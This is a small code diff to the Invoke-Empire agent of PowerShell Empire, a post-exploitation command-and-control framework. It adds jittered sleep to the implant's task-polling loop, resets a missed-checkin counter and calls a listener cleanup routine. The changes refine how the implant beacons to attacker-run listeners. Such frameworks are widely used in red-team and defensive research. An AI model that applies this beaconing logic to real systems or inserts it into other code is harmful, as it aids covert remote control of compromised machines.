@@ -781,6 +781,7 @@ function Invoke-Empire {
 
 	$script:GetTask = {
 		foreach ($Listener in $script:listeners){
+			SleepWithJitter($Listener)	
 			"calling getTask with listener" | Out-File "out.log" -Append -NoClobber
 			$Listener["name"]|Out-File "out.log" -Append -NoClobber
 
@@ -790,6 +791,7 @@ function Invoke-Empire {
 				$Listener['missedCheckins'] += 1
 			}
 			else {
+				$Listener["missedCheckins"] = 0
 				if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
 					"got something not equal to defaultResponse, calling decoderoutingpacket"|Out-File "out.log" -Append -NoClobber
 					Decode-RoutingPacket -PacketData $TaskData
@@ -797,6 +799,7 @@ function Invoke-Empire {
 				break
 			}
 		}
+		(& $script:CleanUpListeners)
 	}
 
     # process a single tasking packet extracted from a tasking and execute the functionality
